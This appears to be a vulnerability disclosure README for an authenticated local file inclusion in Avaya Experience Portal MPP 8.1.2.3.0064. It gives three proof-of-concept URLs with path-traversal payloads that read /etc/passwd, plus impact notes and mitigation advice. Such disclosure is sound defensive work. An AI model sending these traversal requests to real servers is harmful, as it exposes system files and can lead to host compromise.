# LFI-on-Avaya-Experience-Portal-MPP
---
Researcher Attribution:

Chan Shing Hei, Stanley and Lui Man Ho, Rex

--- 
Summary:

A moderate risk vulnerability was identified in Avaya Experience Portal MPP version 8.1.2.3.0064 where an authenticated user can perform Local file inclusion exploitation to obtain file within the web application servers. The vulnerability violates the confidentiality in the server OS level and can potentially lead to Remote code execution if SSH key is presented within the Avaya user directory.
 
Vulnerable Version and Product:

Avaya Experience Portal MPP 8.1.2.3.0064

--- 
Vulnerability information and Proof of Concept:

Vulnerability Authenticated Local File Inclusion in Avaya Experience Portal MPP 8.1.2.3.0064.

CVSS: 6.4 (Medium)

Max CVSS: 6.4 (Medium)

CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N 

Affected URL:

https://\<server-ip\>/mpp/admin/logs/showlogfile.php?dirname=\<dir\>&filename=<file> [filename parameter]

https://\<server-ip\>/mpp/admin/logs/getlogfile.php?dirname=\<dir\>&filename=<file> [filename parameter]

https://\<server-ip\>/mpp/admin/logs/clearlogfile.php?dirname=\<dir\>&filename=<file> [filename parameter]

It was found log viewing function of the Avaya Experience Portal MPP 8.1.2.3.0064 allow local file inclusion in the filename parameter. Attacker can modify the filename parameter to obtain any file within the web servers which the web service account have account to. 

<img width="940" height="387" alt="image (2)" src="https://github.com/user-attachments/assets/22051928-82ea-428d-a571-b95e341cd652" />

---
Proof of Concept

Pre-requisite: Admin user of Avaya Experience Portal MPP.

The following screenshots showed the exploitation of LFI vulnerability to obtain the /etc/passwd of the affected host using Burp Suite.

https://<server-ip>/mpp/admin/logs/getlogfile.php?dirname=Administration&filename=..\..\..\..\..\..\..\..\etc\passwd
<img width="940" height="420" alt="image (3)" src="https://github.com/user-attachments/assets/0b0746f6-7d6c-4bb3-8609-4a666d30c933" />

https://<server-ip>/mpp/admin/logs/showlogfile.php?dirname=Administration&filename=..\..\..\..\..\..\..\..\etc\passwd
<img width="940" height="438" alt="image (4)" src="https://github.com/user-attachments/assets/39fe5bf9-0fec-45e5-8d5d-a0d65747da81" />

https://<server-ip>/mpp/admin/logs/clearlogfile.php?dirname=Administration&filename=..\..\..\..\..\..\..\..\etc\passwd
<img width="940" height="694" alt="image (5)" src="https://github.com/user-attachments/assets/489789dd-2c8d-49cb-826c-2e7e218327c1" />

---
Impact

Severity: Medium

This vulnerability allows a logged-in user to obtain any file which the web service account have access permission to and violate the confidentiality of the system. Under specific conditions (e.g. existence of SSH key for the web service), it is possible to obtain Remote Code Execution.

Specific Risks:

1. Host Compromise: Complete control over the underlying Ubuntu/Linux server.

2. Data Exfiltration: Access to all tables, including hashed passwords and configuration secrets.

3. Lateral Movement: The compromised host can be used as a pivot point to attack other internal Avaya infrastructure.

4. Persistence: An attacker could install a web shell or SSH backdoors to maintain access even after the session ends.

---
Recommended Mitigation

To mitigate the Local File Inclusion (LFI) vulnerability, the application should prevent user-controlled input from influencing file paths or inclusion logic. Implement a strict allow‑list of permitted files or directories and avoid dynamically including files based on request parameters. All file paths should be resolved to absolute paths, normalized, and validated to ensure they remain within an expected application directory. Additionally, enforce the principle of least privilege on the web server and application runtime so that even if file access is attempted, sensitive system files cannot be read.
